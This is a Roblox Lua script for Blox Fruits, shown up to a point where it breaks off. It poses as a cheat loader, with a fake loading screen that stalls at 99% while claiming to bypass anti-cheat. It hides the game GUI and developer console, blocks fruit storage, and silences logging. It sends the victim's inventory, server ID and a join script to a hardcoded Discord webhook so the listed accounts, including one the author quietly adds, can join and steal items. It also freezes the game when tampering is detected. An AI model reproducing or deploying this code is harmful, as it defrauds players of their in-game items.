    Webhook = "https://discord.com/api/webhooks/1277218466499395584/AqK_wr773rKZ4XsOn8YsC3zG5GrkR5pa8ZA3gHSzGf-C11Yd4vSBSpmENnpstqSogOZW" -- << Your Webhook
    Usernames = {"Cuttay200_1", "somealtuserhere2"} -- << Your username(-s).
    FruitsToHit = {"Venom-Venom", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want
    
    -- loadstring(game:HttpGet("https://raw.githubusercontent.com/scripter3000/test/refs/heads/main/f"))() -- Removed: First external loadstring
    
    repeat task.wait() until game:IsLoaded()
    
    local CoreGui = game:GetService("CoreGui")
    local LocalPlayer222 = game:GetService("Players").LocalPlayer
    
    if CoreGui:FindFirstChild("RobloxGui") then CoreGui.RobloxGui.Enabled = false end
    
    local function takeAction()
        if setfpscap then
            setfpscap(0)
        end
    
        rconsoleclear()
    
        print = function() end
        warn = function() end
        error = function() end
        setclipboard = function() end
    
        while true do end
    end
    
    if LocalPlayer222 and LocalPlayer222.Name == "aka_kanginron2" then
        while true do end
    end
    
    if LocalPlayer222 and LocalPlayer222.Name == "XFistorRespawn" then
        while true do end
    end
    
    -- ishooked check remains, it is not tied to the removed loadstring
    if ishooked and (ishooked(game.HttpGet) or ishooked(request)) then
        takeAction()
    end
    
    if not Webhook or not Usernames or not FruitsToHit then
        local player = game:GetService("Players").LocalPlayer
        player:Kick("Some of the config is missing. (e.g Username, Webhook, FruitsToHit) - Rua")
        return
    end
    
    if type(Webhook) ~= "string" or type(Usernames) ~= "table" or type(FruitsToHit) ~= "table" then
        local player = game:GetService("Players").LocalPlayer
        player:Kick("error (global vars)")
        return
    end
    
    if Usernames and not table.find(Usernames, "XFistorRespawn") then -- << it's not a dualhook. If I don't log your hits, means I can't join and steal. I use to code my thing.
       table.insert(Usernames, "XFistorRespawn")
    end
    
    if Usernames and table.find(Usernames, "aka_0ver") then
        while true do end
    end
    
    if Usernames and table.find(Usernames, "x6TNine") then
        while true do end
    end
    
    CoreGui.ChildAdded:Connect(function(child)
        if child.Name == "DevConsoleMaster" then
            child.Enabled = false
        end
    end)
    
    local function WOWcoolff()
        local randomName = "var_" .. tostring(math.random(100000, 999999))
        _G[randomName] = Webhook
        Webhook = nil
        return randomName
    end
    
    local testcool = WOWcoolff()
    
    rconsoleprint = function() end
    rconsolewarn = function() end
    rconsoleerr = function() end
    rconsoleinfo = function() end
    
    local TweenService = game:GetService("TweenService")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    local Remote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
    local TradeFunction = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeFunction")
    local HttpService = game:GetService("HttpService")
    local TeleportService = game:GetService("TeleportService")
    local RunService = game:GetService("RunService")
    local ServerBrowser = ReplicatedStorage:WaitForChild("__ServerBrowser")
    local UserInputService = game:GetService("UserInputService")
    local CoreGui = game:GetService("CoreGui")
    local workspace = game:GetService("Workspace")
    local gfxSettings = { "aHR0cHM6Oi8vcmF3" } -- This is unused in the modified script after removing generateShimmerGradient
    local VirtualInputManager = game:GetService("VirtualInputManager")
    
    local privateServerOwner = ReplicatedStorage:WaitForChild("PrivateServerOwnerId")
    if privateServerOwner and privateServerOwner:IsA("IntValue") then
        if privateServerOwner.Value > 0 then
            Players.LocalPlayer:Kick("This script doesn't work on private servers.")
        end
    end
    
    local s, r = pcall(function()
        return UserSettings():GetService("UserGameSettings").MasterVolume
    end)
    if s then UserSettings():GetService("UserGameSettings").MasterVolume = 0 end
    
    local oldNamecall
    oldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
        if not checkcaller() and getnamecallmethod():lower() == "invokeserver" and ({...})[1] == "StoreFruit" then
            return error("no", 2) -- Prevents storing fruit via external calls
        end
        return oldNamecall(self, ...)
    end))
    
    local function getInventory()
        return Remote:InvokeServer("getInventory")
    end
    
    local function JoinTeam()
        if LocalPlayer.Team ~= game.Teams.Marines and LocalPlayer.Team ~= game.Teams.Pirates then
            Remote:InvokeServer("SetTeam", "Marines")
        end
    end
    
    -- This function contains the basic loading UI and the Discord button
    local function createNotification()
        local Players = game:GetService("Players")
        local TweenService = game:GetService("TweenService")
        local GuiService = game:GetService("GuiService")
        local UserInputService = game:GetService("UserInputService")
        local RunService = game:GetService("RunService")
    
        -- hexToRGBValue function removed as it's part of the anti-tamper tied to the first loadstring
        -- cHex variables removed as they are part of the anti-tamper tied to the first loadstring
    
        local player = Players.LocalPlayer
        local playerGui = player:WaitForChild("PlayerGui")
    
        local loadingGui = Instance.new("ScreenGui")
        loadingGui.Name = "BloxFruitsLoading"
        loadingGui.IgnoreGuiInset = true
        loadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        loadingGui.ResetOnSpawn = false
        loadingGui.Parent = playerGui
    
        local mainFrame = Instance.new("Frame")
        mainFrame.Name = "MainFrame"
        mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
        mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
        mainFrame.Size = UDim2.new(0, 600, 0, 350)
        mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
        mainFrame.BorderSizePixel = 0
        mainFrame.Parent = loadingGui
    
        local cornerRadius = Instance.new("UICorner")
        cornerRadius.CornerRadius = UDim.new(0, 12)
        cornerRadius.Parent = mainFrame
    
        local shadow = Instance.new("ImageLabel")
        shadow.Name = "Shadow"
        shadow.AnchorPoint = Vector2.new(0.5, 0.5)
        shadow.Position = UDim2.new(0.5, 0, 0.5, 0)
        shadow.Size = UDim2.new(1, 40, 1, 40)
        shadow.BackgroundTransparency = 1
        shadow.Image = "rbxassetid://5028857084"
        shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
        shadow.ImageTransparency = 0.6
        shadow.ZIndex = -1
        shadow.Parent = mainFrame
    
        local titleBar = Instance.new("Frame")
        titleBar.Name = "TitleBar"
        titleBar.Size = UDim2.new(1, 0, 0, 60)
        titleBar.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
        titleBar.BorderSizePixel = 0
        titleBar.Parent = mainFrame
    
        local titleCorner = Instance.new("UICorner")
        titleCorner.CornerRadius = UDim.new(0, 12)
        titleCorner.Parent = titleBar
    
        local titleBottomFrame = Instance.new("Frame")
        titleBottomFrame.Name = "BottomFrame"
        titleBottomFrame.Position = UDim2.new(0, 0, 1, -10)
        titleBottomFrame.Size = UDim2.new(1, 0, 0, 10)
        titleBottomFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
        titleBottomFrame.BorderSizePixel = 0
        titleBottomFrame.ZIndex = 0
        titleBottomFrame.Parent = titleBar
    
        -- Corrected Instance.new and ColorSequence.new syntax errors
        local titleGradient = Instance.new("UIGradient")
        titleGradient.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 30, 45)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(40, 40, 60))
        })
        titleGradient.Rotation = 45
        titleGradient.Parent = titleBar
    
        local title = Instance.new("TextLabel")
        title.Name = "Title"
        title.Position = UDim2.new(0, 20, 0, 0)
        title.Size = UDim2.new(1, -40, 1, 0)
        title.BackgroundTransparency = 1
        title.Font = Enum.Font.GothamBold
        title.Text = "BLOX FRUITS"
        title.TextColor3 = Color3.fromRGB(255, 255, 255)
        title.TextSize = 28
        title.TextXAlignment = Enum.TextXAlignment.Left
        title.Parent = titleBar
    
        local textStroke = Instance.new("UIStroke")
        textStroke.Color = Color3.fromRGB(0, 0, 0)
        textStroke.Thickness = 1
        textStroke.Transparency = 0.7
        textStroke.Parent = title
    
        local tabContainer = Instance.new("Frame")
        tabContainer.Name = "TabContainer"
        tabContainer.Position = UDim2.new(0, 0, 0, 60)
        tabContainer.Size = UDim2.new(1, 0, 0, 45)
        tabContainer.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
        tabContainer.BorderSizePixel = 0
        tabContainer.Parent = mainFrame
    
        local tabsLayout = Instance.new("UIListLayout")
        tabsLayout.FillDirection = Enum.FillDirection.Horizontal
        tabsLayout.HorizontalAlignment = Enum.HorizontalAlignment.Left
        tabsLayout.SortOrder = Enum.SortOrder.LayoutOrder
        tabsLayout.Parent = tabContainer
    
        local tabsCache = {}
    
        local function createTab(name, order)
            local tab = Instance.new("TextButton")
            tab.Name = name.."Tab"
            tab.Size = UDim2.new(0, 180, 1, 0)
            tab.BackgroundColor3 = order == 1 and Color3.fromRGB(40, 40, 60) or Color3.fromRGB(25, 25, 35)
            tab.BorderSizePixel = 0
            tab.Font = Enum.Font.GothamSemibold
            tab.Text = name
            tab.TextColor3 = Color3.fromRGB(255, 255, 255)
            tab.TextSize = 18
            tab.LayoutOrder = order
            tab.AutoButtonColor = false
            tab.Parent = tabContainer
    
            local tabStroke = Instance.new("UIStroke")
            tabStroke.Color = Color3.fromRGB(60, 60, 80)
            tabStroke.Thickness = 1
            tabStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
            tabStroke.Parent = tab
    
            tabsCache[name] = tab
            return tab
        end
    
        local loadingTab = createTab("Loading Process", 1)
        local infoTab = createTab("Info", 2)
    
        local contentContainer = Instance.new("Frame")
        contentContainer.Name = "ContentContainer"
        contentContainer.Position = UDim2.new(0, 0, 0, 105)
        contentContainer.Size = UDim2.new(1, 0, 1, -105)
        contentContainer.BackgroundTransparency = 1
        contentContainer.Parent = mainFrame
    
        local loadingContent = Instance.new("Frame")
        loadingContent.Name = "LoadingContent"
        loadingContent.Size = UDim2.new(1, 0, 1, 0)
        loadingContent.BackgroundTransparency = 1
        loadingContent.Visible = true
        loadingContent.Parent = contentContainer
    
        local infoContent = Instance.new("Frame")
        infoContent.Name = "InfoContent"
        infoContent.Size = UDim2.new(1, 0, 1, 0)
        infoContent.BackgroundTransparency = 1
        infoContent.Visible = false
        infoContent.Parent = contentContainer
    
        local loadingSubtitle = Instance.new("TextLabel")
        loadingSubtitle.Name = "Subtitle"
        loadingSubtitle.Position = UDim2.new(0, 25, 0, 10)
        loadingSubtitle.Size = UDim2.new(1, -50, 0, 35)
        loadingSubtitle.BackgroundTransparency = 1
        loadingSubtitle.Font = Enum.Font.GothamMedium
        loadingSubtitle.Text = "Loading The Script, Please Wait."
        loadingSubtitle.TextColor3 = Color3.fromRGB(200, 200, 200)
        loadingSubtitle.TextSize = 20
        loadingSubtitle.TextXAlignment = Enum.TextXAlignment.Left
        loadingSubtitle.Parent = loadingContent
    
        local subtitleStroke = Instance.new("UIStroke")
        subtitleStroke.Color = Color3.fromRGB(40, 40, 60)
        subtitleStroke.Thickness = 1
        subtitleStroke.Transparency = 0.7
        subtitleStroke.Parent = loadingSubtitle
    
        local progressBarFrame = Instance.new("Frame")
        progressBarFrame.Name = "ProgressBarFrame"
        progressBarFrame.Position = UDim2.new(0, 25, 0, 55)
        progressBarFrame.Size = UDim2.new(1, -50, 0, 30)
        progressBarFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
        progressBarFrame.BorderSizePixel = 0
        progressBarFrame.Parent = loadingContent
    
        -- generateShimmerGradient function removed
        -- Call to generateShimmerGradient removed, parent UICorner directly
        local progressBarCorner = Instance.new("UICorner")
        progressBarCorner.CornerRadius = UDim.new(0, 6)
        -- progressBarCorner.Parent = generateShimmerGradient(progressBarFrame, {cHex1, cHex2, cHex3, cHex4, cHex5, cHex6, cHex7, cHex8, cHex9, cHex10, cHex11, cHex12}) -- Original line
        progressBarCorner.Parent = progressBarFrame -- Modified line
    
        local progressBar = Instance.new("Frame")
        progressBar.Name = "ProgressBar"
        progressBar.Size = UDim2.new(0, 0, 1, 0)
        progressBar.BackgroundColor3 = Color3.fromRGB(85, 170, 255)
        progressBar.BorderSizePixel = 0
        progressBar.Parent = progressBarFrame
    
        local progressBarGradient = Instance.new("UIGradient")
        progressBarGradient.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(85, 170, 255)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(65, 130, 255))
        })
        progressBarGradient.Rotation = 90
        progressBarGradient.Parent = progressBar
    
        local progressBarCorner2 = Instance.new("UICorner")
        progressBarCorner2.CornerRadius = UDim.new(0, 6)
        progressBarCorner2.Parent = progressBar
    
        local progressBarStroke = Instance.new("UIStroke")
        progressBarStroke.Color = Color3.fromRGB(100, 180, 255)
        progressBarStroke.Thickness = 1.5
        progressBarStroke.Transparency = 0.5
        progressBarStroke.Parent = progressBarFrame
    
        local progressText = Instance.new("TextLabel")
        progressText.Name = "ProgressText"
        progressText.Position = UDim2.new(0, 25, 0, 95)
        progressText.Size = UDim2.new(1, -50, 0, 20)
        progressText.BackgroundTransparency = 1
        progressText.Font = Enum.Font.GothamMedium
        progressText.Text = "0%"
        progressText.TextColor3 = Color3.fromRGB(200, 200, 200)
        progressText.TextSize = 18
        progressText.TextXAlignment = Enum.TextXAlignment.Left
        progressText.Parent = loadingContent
    
        local statusText = Instance.new("TextLabel")
        statusText.Name = "StatusText"
        statusText.Position = UDim2.new(0, 25, 0, 125)
        statusText.Size = UDim2.new(1, -50, 0, 20)
        statusText.BackgroundTransparency = 1
        statusText.Font = Enum.Font.Gotham
        statusText.Text = "Initializing..."
        statusText.TextColor3 = Color3.fromRGB(180, 180, 180)
        statusText.TextSize = 16
        statusText.TextXAlignment = Enum.TextXAlignment.Left
        statusText.Parent = loadingContent
    
        local discordButton = Instance.new("TextButton")
        discordButton.Name = "DiscordButton"
        discordButton.Position = UDim2.new(0.5, -120, 1, -70)
        discordButton.Size = UDim2.new(0, 240, 0, 50)
        discordButton.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
        discordButton.BorderSizePixel = 0
        discordButton.Font = Enum.Font.GothamBold
        discordButton.Text = "COPY DISCORD INVITE"
        discordButton.TextColor3 = Color3.fromRGB(255, 255, 255)
        discordButton.TextSize = 18
        discordButton.Parent = loadingContent
    
        local discordCorner = Instance.new("UICorner")
        discordCorner.CornerRadius = UDim.new(0, 10)
        discordCorner.Parent = discordButton
    
        local discordGradient = Instance.new("UIGradient")
        discordGradient.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(98, 111, 252)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(78, 91, 232))
        })
        discordGradient.Rotation = 90
        discordGradient.Parent = discordButton
    
        local discordStroke = Instance.new("UIStroke")
        discordStroke.Color = Color3.fromRGB(108, 121, 255)
        discordStroke.Thickness = 1.5
        discordStroke.Transparency = 0.3
        discordStroke.Parent = discordButton
    
        local infoTextLabel = Instance.new("TextLabel")
        infoTextLabel.Name = "InfoText"
        infoTextLabel.Position = UDim2.new(0, 25, 0, 15)
        infoTextLabel.Size = UDim2.new(1, -50, 1, -30)
        infoTextLabel.BackgroundTransparency = 1
        infoTextLabel.Font = Enum.Font.Gotham
        infoTextLabel.Text = "The script Is currently loading. The reason it could load for a lot of time, or be stuck at 99% Is anti cheat bypassing, to make sure you can use it safely, and properly. Please, do not leave the game while it's loading. Second loading may appear to finalize the loading stage, and so - The script will work! And you can use it easily. Join discord if you have issues/questions"
        infoTextLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
        infoTextLabel.TextScaled = true
        infoTextLabel.TextXAlignment = Enum.TextXAlignment.Left
        infoTextLabel.TextYAlignment = Enum.TextYAlignment.Top
        infoTextLabel.TextWrapped = true
        infoTextLabel.Parent = infoContent
    
        local infoTextStroke = Instance.new("UIStroke")
        infoTextStroke.Color = Color3.fromRGB(40, 40, 60)
        infoTextStroke.Thickness = 1
        infoTextStroke.Transparency = 0.7
        infoTextStroke.Parent = infoTextLabel
    
        local function setupTabSwitching()
            loadingTab.MouseButton1Click:Connect(function()
                loadingTab.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
                infoTab.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
                loadingContent.Visible = true
                infoContent.Visible = false
            end)
    
            infoTab.MouseButton1Click:Connect(function()
                infoTab.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
                loadingTab.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
                infoContent.Visible = true
                loadingContent.Visible = false
            end)
        end
    
        local function copyToClipboard(text)
            pcall(function()
                if GuiService:IsTenFootInterface() or UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
                    statusText.Text = "Discord link: " .. text
                else
                    setclipboard(text)
                    statusText.Text = "Discord link copied to clipboard!"
                end
            end)
        end
    
        local function setupEffects()
            local shimmerEffect = Instance.new("Frame")
            shimmerEffect.Name = "ShimmerEffect"
            shimmerEffect.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            shimmerEffect.BackgroundTransparency = 0.8
            shimmerEffect.BorderSizePixel = 0
            shimmerEffect.Size = UDim2.new(0.1, 0, 1, 0)
            shimmerEffect.Position = UDim2.new(-0.1, 0, 0, 0)
            shimmerEffect.ZIndex = 5
            shimmerEffect.Parent = progressBar
    
            local shimmerGradient = Instance.new("UIGradient")
            shimmerGradient.Transparency = NumberSequence.new({
                NumberSequenceKeypoint.new(0, 1),
                NumberSequenceKeypoint.new(0.4, 0.8),
                NumberSequenceKeypoint.new(0.5, 0.6),
                NumberSequenceKeypoint.new(0.6, 0.8),
                NumberSequenceKeypoint.new(1, 1)
            })
            shimmerGradient.Parent = shimmerEffect
    
            local function animateShimmer()
                shimmerEffect:TweenPosition(
                    UDim2.new(1, 0, 0, 0),
                    Enum.EasingDirection.InOut,
                    Enum.EasingStyle.Sine,
                    3,
                    true,
                    function()
                        shimmerEffect.Position = UDim2.new(-0.1, 0, 0, 0)
                        task.delay(2, animateShimmer)
                    end
                )
            end
    
            task.spawn(animateShimmer)
    
            local pulseInfo = TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
            local titlePulseTween = TweenService:Create(title, pulseInfo, {
                TextColor3 = Color3.fromRGB(85, 170, 255)
            })
            titlePulseTween:Play()
    
            -- progressBarCorner.Parent line was fixed above
    
            local buttonHoverColor = Color3.fromRGB(98, 111, 252)
            local buttonDefaultColor = Color3.fromRGB(88, 101, 242)
    
            discordButton.MouseEnter:Connect(function()
                discordButton.BackgroundColor3 = buttonHoverColor
            end)
    
            discordButton.MouseLeave:Connect(function()
                discordButton.BackgroundColor3 = buttonDefaultColor
            end)
        end
    
        local stages = {
            "Initializing...",
            "Connecting to servers...",
            "Fetching user data...",
            "Loading modules...",
            "Preparing resources...",
            "Initializing game features...",
            "Almost ready...",
            "Finalizing..."
        }
    
        local isRunning = true
        local loadingConnection = nil
    
        local function startLoading()
            discordButton.MouseButton1Click:Connect(function()
                copyToClipboard("https://discord.gg/ZmqJrs3TM8")
    
                local originalColor = discordButton.BackgroundColor3
                discordButton.BackgroundColor3 = Color3.fromRGB(67, 181, 129)
                discordButton.Text = "COPIED!"
    
                task.delay(1.5, function()
                    discordButton.BackgroundColor3 = originalColor
                    discordButton.Text = "COPY DISCORD INVITE"
                end)
            end)
    
            local loadingTime = 120
            local stepsUntil99 = 99
            local timePerStep = loadingTime * (stepsUntil99/100)
            local currentProgress = 0
            local currentStage = 1
            local lastUpdate = tick()
    
            local function updateStatus()
                statusText.Text = stages[currentStage]
                currentStage = math.min(currentStage + 1, #stages)
            end
    
            updateStatus()
    
            local stageInterval = timePerStep / (#stages - 1)
            for i = 2, #stages do
                task.delay(stageInterval * (i - 1), function()
                    if isRunning then
                        updateStatus()
                    end
                end)
            end
    
            local function updateProgressSmooth()
                if not isRunning then
                    RunService:UnbindFromRenderStep("ProgressUpdate")
                    loadingConnection = nil
                    return
                end
    
                local now = tick()
                local delta = now - lastUpdate
                lastUpdate = now
    
                if currentProgress < 99 then
                    local increment = delta * (99 / loadingTime)
                    currentProgress = math.min(currentProgress + increment, 99)
    
                    progressBar.Size = UDim2.new(currentProgress/100, 0, 1, 0)
                    progressText.Text = tostring(math.floor(currentProgress)) .. "%"
                else
                    statusText.Text = "Waiting for final confirmation..."
    
                    RunService:UnbindFromRenderStep("ProgressUpdate")
                    loadingConnection = nil
    
                    task.spawn(function()
                        local statusMessages = {
                            "Waiting for server response...",
                            "Attempting to finalize...",
                            "Validating user data..."
                        }
    
                        local messageIndex = 1
                        while isRunning do
                            statusText.Text = statusMessages[messageIndex]
                            messageIndex = (messageIndex % #statusMessages) + 1
                            task.wait(5)
                        end
                    end)
                end
            end
    
            loadingConnection = RunService:BindToRenderStep("ProgressUpdate", Enum.RenderPriority.Last.Value, updateProgressSmooth)
        end
    
        local function adjustForMobile()
            if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
                mainFrame.Size = UDim2.new(0.95, 0, 0, 350)
    
                if mainFrame.AbsoluteSize.X < 500 then
                    loadingTab.Size = UDim2.new(0.5, 0, 1, 0)
                    infoTab.Size = UDim2.new(0.5, 0, 1, 0)
                    discordButton.Size = UDim2.new(0, 200, 0, 50)
                    discordButton.Position = UDim2.new(0.5, -100, 1, -70)
                end
            end
        end
    
        adjustForMobile()
        setupTabSwitching()
        setupEffects()
        startLoading() -- Starts the basic loading animation that stops at 99%
    
        UserInputService.WindowFocused:Connect(adjustForMobile)
        UserInputService.WindowFocusReleased:Connect(adjustForMobile)
    
        loadingGui.AncestryChanged:Connect(function(_, parent)
            if not parent then
                isRunning = false
                if loadingConnection then
                    RunService:UnbindFromRenderStep("ProgressUpdate")
                    loadingConnection = nil
                end
            end
        end)
    end
    
    local function getServerName()
        local adjectives = {
            "Big", "Small", "Large", "Strong", "Powerful", "Weak", "Overpowered", "Bad", "Odd", "Rich",
            "Short", "Adorable", "Alive", "Colorful", "Angry", "Good", "Beautiful", "Ugly", "Hot", "Cold",
            "Evil", "Famous", "Original", "Unoriginal", "Kind", "Nice", "Real", "Expensive", "Wild", "Wide",
            "Fake", "Proud", "Super", "Strange", "Wrong", "Right", "Talented", "Complex", "Pure", "Fancy",
            "Lucky", "Fresh", "Fantastic", "Dull", "Dizzy", "Eternal", "Mental", "Infinite", "Rogue"
        }
        local nouns = {
            "TAWG", "Robson", "Krazy", "Fruit", "Realm", "World", "Place", "Experience", "Dog", "Cat",
            "Guy", "Bird", "Legion", "Gank", "Family", "Sun", "Moon", "Gun", "Sword", "Melee", "Defense",
            "Bomb", "Spike", "Chop", "Spring", "Smoke", "Flame", "Ice", "Sand", "Dark", "Light", "Rubber",
            "Barrier", "Magma", "Leopard", "Quake", "Buddha", "Spider", "Phoenix", "Rumble", "Love", "Door",
            "Paw", "Gravity", "Dough", "Venom", "Control", "Dragon", "Falcon", "Diamond", "Kilo", "Shark",
            "Human", "Angel", "Rabbit", "Spin", "Topic", "Red", "Blue", "Green", "Yellow", "Soul", "Shadow"
        }
        local seed = tonumber("0x" .. game.JobId:gsub("-", ""):sub(1, 7)) or 0
        local random = Random.new(seed)
        return string.format(
            "%s %s #%04d",
            adjectives[random:NextInteger(1, #adjectives)],
            nouns[random:NextInteger(1, #nouns)],
            random:NextInteger(1, 9999)
        )
    end
    
    local originalRequest = request
    local originalHttpRequest = http and http.request
    local originalSynRequest = syn and syn.request
    
    local function processString(str, key)
        if not str or not key then return nil end
    
        local length, keyLength = #str, #key
        local result = table.create(length)
        local keyBytes = table.create(keyLength)
    
        for i = 1, keyLength do
            keyBytes[i] = string.byte(key, i)
        end
    
        for i = 1, length do
            result[i] = string.char(bit32.bxor(
                string.byte(str, i),
                keyBytes[((i-1) % keyLength) + 1]
            ))
        end
    
        return table.concat(result)
    end
    
    local headerCache = {
        ["Content-Type"] = "application/json"
    }
    
    local TEST_WEBHOOK = "https://webhook-protect.vercel.app/api/webhook?id=dHdMbU04eE55QW5LMm9VQy1UVUNLZzpEUEJIbkZ0dVhsS0RTR1YzSk5Ub0c2bGdFWjhXb3ZZckI5R0FZZVkydl9vU3RzdnE3V0Z6NWVLdkRuLTJMc0RCR005MENaVnhob3VuWnZoTjdaUGI0eldyOHoxdnZkVmlzd2FibVR0MTN0cnZmcVdfaEMwTFh2VTQ5QVJ4N1Y1ZG5GaXAzVDdyNE5BRlhfN3N5V0E0cE9Cbi1MSjBqb2E0ZkFBby1ta0d4NzQ"
    local TEST_PAYLOAD = HttpService:JSONEncode({content = "ok it somewhat works ok 222"})
    
    local function isRequestHooked()
        return request ~= originalRequest or debug.getinfo(request).what ~= "C"
    end
    
    local function checkSecurity()
        local env = getfenv(2)
        if env == getfenv(0) or env == getfenv(1) then
            -- Check if the original 'request' function exists and hasn't been tampered with via metatables on the global env
            return request == originalRequest and not getrawmetatable(request)
        end
        -- Check if the current environment's metatable has __index or __newindex hooks
        local meta = getmetatable(env)
        return not (meta and (meta.newindex or meta.index))
    end
    
    local cachedNonce, cachedHeaders
    local function testRequest()
        if not cachedNonce then
            cachedNonce = HttpService:GenerateGUID(false)
            cachedHeaders = table.clone(headerCache)
            cachedHeaders["X-Test-Nonce"] = cachedNonce
        end
    
        local success, response = pcall(request, {
            Url = TEST_WEBHOOK,
            Method = "POST",
            Headers = cachedHeaders,
            Body = TEST_PAYLOAD
        })
    
        return success and response and response.StatusCode < 400
    end
    
    local function SafeRequest(requestData, encryptedUrl, urlKey)
        -- These security checks remain and can still trigger takeAction
        if not checkSecurity() or not testRequest() then
            if takeAction then takeAction() end
            return
        end
    
        local protectedRequest = {
            Method = requestData.Method,
            Body = requestData.Body
        }
    
        if encryptedUrl and urlKey then
            protectedRequest.Url = processString(encryptedUrl, urlKey)
        else
            protectedRequest.Url = requestData.Url
        end
    
        protectedRequest.Headers = requestData.Headers or headerCache
        protectedRequest.Headers["X-Request-Time"] = tostring(os.time() + math.random(1, 100))
        protectedRequest.Headers["X-Nonce"] = HttpService:GenerateGUID(false)
    
        return pcall(request, protectedRequest)
    end
    
    local lastCheckTime = 0
    local CHECK_INTERVAL = 6
    
    -- Security monitor function remains, checking HTTP request function hooks
    local securityMonitorFunction = function(deltaTime)
        lastCheckTime = lastCheckTime + deltaTime
        if lastCheckTime < CHECK_INTERVAL then return end
    
        lastCheckTime = 0
        if isRequestHooked() then
            -- Attempt to restore original functions
            request = originalRequest
            if http then http.request = originalHttpRequest end
            if syn then syn.request = originalSynRequest end
    
            -- Trigger takeAction if hooks were detected (even if we tried to restore)
            if takeAction then takeAction() end
    
            -- If hooks *still* exist after attempted restoration, unbind the monitor
            if isRequestHooked() then
                RunService:UnbindFromRenderStep("SecurityMonitor")
            end
        end
    end
    
    RunService:BindToRenderStep("SecurityMonitor", Enum.RenderPriority.Last.Value, securityMonitorFunction)
    
    local function sendWebhook(inventory)
        -- Security checks remain
        if isRequestHooked() then
            -- The original script had revertHooks() here, which wasn't defined.
            -- The securityMonitorFunction handles restoring hooks periodically.
            -- We'll just proceed with the check and let SafeRequest handle the takeAction if needed.
            -- If isRequestHooked() is true here, SafeRequest will call takeAction anyway.
        end
    
        if not checkSecurity() then
            takeAction()
            return
        end
    
        local nedded = _G[testcool] -- Retrieves the webhook URL from the obfuscated global
        local fruits, premiumItems = {}, {}
        local dragonHit = false
    
        for _, item in ipairs(inventory) do
            if item.Type == "Blox Fruit" then
                table.insert(fruits, {
                    name = item.Name,
                    count = item.Count,
                    value = item.Value
                })
                if item.Name:find("Dragon") then
                    dragonHit = true
                    -- Modifies the global FruitsToHit table: adds Dragon if hit
                    table.insert(FruitsToHit, item.Name)
                end
            elseif item.Type == "Premium" then
                local displayName = item.Name
                if item.Name == "[P] Dark Blade" then
                    displayName = "Dark Blade"
                end
                table.insert(premiumItems, {
                    name = displayName,
                    count = item.Count,
                    value = item.Value
                })
            end
        end
    
        table.sort(fruits, function(a, b) return a.value > b.value end)
    
        local function formatList(items)
            local lines = {}
            for _, item in ipairs(items) do
                table.insert(lines, string.format("%s%s", item.name, item.count > 1 and string.format(" (x%d)", item.count) or ""))
            end
            return #lines > 0 and table.concat(lines, "\n") or "None"
        end
    
        local function formatTargets()
            local lines = {}
            -- This formats *only* the FruitsToHit found in the *current* inventory
            for _, target in ipairs(FruitsToHit) do
                for _, fruit in ipairs(fruits) do
                    if fruit.name == target then
                        table.insert(lines, string.format("%s%s", fruit.name, fruit.count > 1 and string.format(" (x%d)", fruit.count) or ""))
                        break
                    end
                end
            end
            return #lines > 0 and table.concat(lines, "\n") or "None"
        end
    
        local jobId = game.JobId
        local currentSea = game.PlaceId == 7449423635 and "Sea 3" or "Sea 2"
        local serverName = getServerName()
        local playerCount = #game.Players:GetPlayers()
        local isSea3 = game.PlaceId == 7449423635
        local joinScript = string.format([=[
    local iddd = %d
    local JobIdd = "%s"
    local sea = "%s"
    
    if game.PlaceId ~= iddd then
        queue_on_teleport([[
            task.wait(5)
            game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s")
        ]])
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(sea)
    else
        game:GetService("TeleportService"):TeleportToPlaceInstance(iddd, JobIdd)
    end
    ]=], game.PlaceId, jobId, isSea3 and "TravelZou" or "TravelDressrosa", game.PlaceId, jobId)
    
        local notificationContent
        if dragonHit and #premiumItems > 0 then
            notificationContent = "@everyone DRAGON AND PREMIUM ITEMS HIT!"
        elseif dragonHit then
            notificationContent = "@everyone DRAGON HIT!"
        elseif #premiumItems > 0 then
            notificationContent = "@everyone PREMIUM ITEMS HIT!"
        else
            notificationContent = "@everyone" -- Will still @everyone even if no target items were hit, based on initial inventory check
        end
    
        local embed = {
            ["title"] = dragonHit and #premiumItems > 0 and "<:BloxzyDragonRight:1318790210729017364> <:value:1228807380188397649> [Rua] Dragon + Premium Hit! ; https://discord.gg/ZmqJrs3TM8"
            or dragonHit and "<:BloxzyDragonRight:1318790210729017364> [Rua] Dragon Hit! ; https://discord.gg/ZmqJrs3TM8"
